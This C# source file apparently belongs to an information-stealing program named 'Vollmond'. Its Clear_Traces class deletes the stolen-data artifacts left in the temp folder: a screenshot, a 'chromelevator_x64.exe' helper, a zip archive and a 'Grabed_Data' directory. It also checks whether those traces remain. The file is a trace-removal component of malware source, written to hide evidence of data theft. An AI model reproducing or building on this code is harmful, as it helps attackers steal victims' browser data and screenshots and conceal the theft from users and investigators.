using System.Diagnostics;

namespace Vollmond
{
    internal class Clear_Traces
    {
        public static void Clear_traces()
        {
            string tempPath = Path.GetTempPath();

            File.Delete(Path.Combine(tempPath, "screenshot.png"));
            File.Delete(Path.Combine(tempPath, "chromelevator_x64.exe"));
            File.Delete(Program.zipPath);
            Directory.Delete(Path.Combine(tempPath, "Grabed_Data"), true);
        }

        public static bool TracesExists()
        {
            string temp = Path.GetTempPath();
            if (File.Exists(Program.zipPath) || File.Exists(Path.Combine(temp, "screenshot.png")) || Directory.Exists(Path.Combine(temp, "Grabed_Data")))
            {
                return true;
            }
            return false;
        }
    }
}
